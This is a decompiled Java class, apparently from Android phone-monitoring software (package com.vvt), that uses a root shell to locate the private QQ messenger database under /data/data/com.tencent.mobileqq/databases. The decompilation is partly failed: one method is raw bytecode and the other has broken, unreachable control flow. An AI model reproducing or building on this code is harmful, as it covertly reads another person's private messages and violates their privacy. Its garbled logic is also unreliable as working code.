package com.vvt.n.a.d;

import com.vvt.ag.b;
import com.vvt.io.p;
import com.vvt.shell.ShellUtil;

public class a
{
  private static final String a = a.class.getSimpleName();
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.a;
  
  public static String a()
  {
    String str = b();
    boolean bool1 = b.a(str);
    boolean bool3;
    if (!bool1)
    {
      Object localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      str = str + ".db";
      localObject = "/data/data/com.tencent.mobileqq/databases";
      str = p.a((String)localObject, str);
      bool1 = ShellUtil.b(str);
      boolean bool2 = b;
      if ((!bool2) || (bool1)) {
        return str;
      }
      bool3 = c;
      if (!bool3) {}
    }
    for (;;)
    {
      bool3 = false;
      str = null;
      break;
      bool3 = c;
      if (!bool3) {}
    }
  }
  
  /* Error */
  public static String b()
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_0
    //   2: iconst_1
    //   3: istore_1
    //   4: ldc 62
    //   6: astore_2
    //   7: invokestatic 67	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   10: astore_3
    //   11: ldc 69
    //   13: astore 4
    //   15: iconst_1
    //   16: istore 5
    //   18: iload 5
    //   20: anewarray 4	java/lang/Object
    //   23: astore 6
    //   25: ldc 71
    //   27: astore 7
    //   29: aload 6
    //   31: iconst_0
    //   32: aload 7
    //   34: aastore
    //   35: aload 4
    //   37: aload 6
    //   39: invokestatic 77	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   42: astore 4
    //   44: aload_3
    //   45: aload 4
    //   47: invokevirtual 80	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   50: astore_2
    //   51: getstatic 23	com/vvt/n/a/d/a:removeFromPath	Z
    //   54: istore 8
    //   56: iload 8
    //   58: ifeq +3 -> 61
    //   61: aload_3
    //   62: ifnull +7 -> 69
    //   65: aload_3
    //   66: invokevirtual 83	com/vvt/shell/f:d	()V
    //   69: aload_2
    //   70: invokestatic 36	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   73: istore 9
    //   75: iload 9
    //   77: ifne +58 -> 135
    //   80: ldc 85
    //   82: invokestatic 91	java/util/regex/Pattern:compile	(Ljava/lang/String;)Ljava/util/regex/Pattern;
    //   85: astore_3
    //   86: aload_3
    //   87: aload_2
    //   88: invokevirtual 95	java/util/regex/Pattern:matcher	(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;
    //   91: astore_2
    //   92: aload_2
    //   93: invokevirtual 101	java/util/regex/Matcher:find	()Z
    //   96: istore 9
    //   98: iload 9
    //   100: ifeq +35 -> 135
    //   103: aload_2
    //   104: iconst_0
    //   105: invokevirtual 105	java/util/regex/Matcher:group	(I)Ljava/lang/String;
    //   108: astore_2
    //   109: getstatic 23	com/vvt/n/a/d/a:removeFromPath	Z
    //   112: istore_0
    //   113: iload_0
    //   114: ifeq +3 -> 117
    //   117: aload_2
    //   118: areturn
    //   119: astore_2
    //   120: iconst_0
    //   121: istore 9
    //   123: aconst_null
    //   124: astore_3
    //   125: aload_3
    //   126: ifnull +7 -> 133
    //   129: aload_3
    //   130: invokevirtual 83	com/vvt/shell/f:d	()V
    //   133: aload_2
    //   134: athrow
    //   135: ldc 50
    //   137: iload_1
    //   138: invokestatic 110	com/vvt/shell/LinuxFile:a	(Ljava/lang/String;Z)Ljava/util/ArrayList;
    //   141: astore_2
    //   142: aload_2
    //   143: ifnull +93 -> 236
    //   146: aload_2
    //   147: invokevirtual 116	java/util/ArrayList:size	()I
    //   150: istore 9
    //   152: iload 9
    //   154: ifle +82 -> 236
    //   157: ldc 118
    //   159: invokestatic 91	java/util/regex/Pattern:compile	(Ljava/lang/String;)Ljava/util/regex/Pattern;
    //   162: astore_3
    //   163: aload_2
    //   164: invokevirtual 122	java/util/ArrayList:iterator	()Ljava/util/Iterator;
    //   167: astore 4
    //   169: aload 4
    //   171: invokeinterface 127 1 0
    //   176: istore 10
    //   178: iload 10
    //   180: ifeq +56 -> 236
    //   183: aload 4
    //   185: invokeinterface 131 1 0
    //   190: checkcast 107	com/vvt/shell/LinuxFile
    //   193: astore_2
    //   194: aload_2
    //   195: invokevirtual 133	com/vvt/shell/LinuxFile:d	()Ljava/lang/String;
    //   198: astore 6
    //   200: aload_3
    //   201: aload 6
    //   203: invokevirtual 95	java/util/regex/Pattern:matcher	(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;
    //   206: astore 6
    //   208: aload 6
    //   210: invokevirtual 101	java/util/regex/Matcher:find	()Z
    //   213: istore 5
    //   215: iload 5
    //   217: ifeq -48 -> 169
    //   220: aload_2
    //   221: invokevirtual 133	com/vvt/shell/LinuxFile:d	()Ljava/lang/String;
    //   224: astore_2
    //   225: getstatic 23	com/vvt/n/a/d/a:removeFromPath	Z
    //   228: istore_0
    //   229: iload_0
    //   230: ifeq -113 -> 117
    //   233: goto -116 -> 117
    //   236: iconst_0
    //   237: istore 10
    //   239: aconst_null
    //   240: astore_2
    //   241: goto -124 -> 117
    //   244: astore_3
    //   245: iconst_0
    //   246: istore 9
    //   248: aconst_null
    //   249: astore_3
    //   250: aload_3
    //   251: ifnull -182 -> 69
    //   254: goto -189 -> 65
    //   257: astore_2
    //   258: goto -133 -> 125
    //   261: astore 4
    //   263: goto -13 -> 250
    // Local variable table:
    //   start	length	slot	name	signature
    //   1	229	0	bool1	boolean
    //   3	135	1	bool2	boolean
    //   6	112	2	localObject1	Object
    //   119	15	2	localObject2	Object
    //   141	100	2	localObject3	Object
    //   257	1	2	localObject4	Object
    //   10	191	3	localObject5	Object
    //   244	1	3	localCannotGetRootShellException1	com.vvt.shell.CannotGetRootShellException
    //   249	2	3	localObject6	Object
    //   13	171	4	localObject7	Object
    //   261	1	4	localCannotGetRootShellException2	com.vvt.shell.CannotGetRootShellException
    //   16	200	5	bool3	boolean
    //   23	186	6	localObject8	Object
    //   27	6	7	str	String
    //   54	3	8	bool4	boolean
    //   73	49	9	bool5	boolean
    //   150	97	9	i	int
    //   176	62	10	bool6	boolean
    // Exception table:
    //   from	to	target	type
    //   7	10	119	finally
    //   7	10	244	com/vvt/shell/CannotGetRootShellException
    //   18	23	257	finally
    //   32	35	257	finally
    //   37	42	257	finally
    //   45	50	257	finally
    //   51	54	257	finally
    //   18	23	261	com/vvt/shell/CannotGetRootShellException
    //   32	35	261	com/vvt/shell/CannotGetRootShellException
    //   37	42	261	com/vvt/shell/CannotGetRootShellException
    //   45	50	261	com/vvt/shell/CannotGetRootShellException
    //   51	54	261	com/vvt/shell/CannotGetRootShellException
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/n/a/d/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */